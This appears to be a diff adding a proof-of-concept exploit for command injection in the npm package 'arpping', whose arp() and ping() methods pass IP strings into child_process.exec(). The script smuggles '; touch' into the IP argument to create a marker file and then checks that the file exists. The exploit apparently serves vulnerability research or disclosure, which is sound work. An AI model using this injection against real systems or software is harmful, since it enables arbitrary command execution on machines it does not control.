@@ -1,0 +1,31 @@
+```javascript
+// Exploit for command injection in "arpping" (node_modules/arpping/index.js)
+//
+// Arpping.prototype.arp() and Arpping.prototype.ping() build shell commands by
+// directly interpolating attacker-controlled IP strings into a template string
+// that is passed to child_process.exec(), e.g.:
+//     exec(`arp ${ip}`, ...)
+//     exec(`ping ${flag} ${this.timeout} ${ip}`, ...)
+// Because exec() runs its argument through /bin/sh, any shell metacharacters in
+// `ip` (which comes from searchByIpAddress/discover/ping/arp arguments) are
+// interpreted by the shell, allowing arbitrary command execution.
+
+const Arpping = require("arpping");
+const fs = require("fs");
+
+const arpping = new Arpping({ timeout: 1 });
+
+const marker = `/tmp/arpping_pwned_${Date.now()}`;
+
+// Malicious "IP" that injects a second shell command via `;`
+const maliciousIp = `127.0.0.1; touch ${marker}`;
+
+arpping.arp([maliciousIp])
+  .then(() => {
+    console.log("Injected command executed:", fs.existsSync(marker));
+  })
+  .catch(err => {
+    console.log("Error (injection may still have run):", err.message);
+    console.log("Injected command executed:", fs.existsSync(marker));
+  });
+```
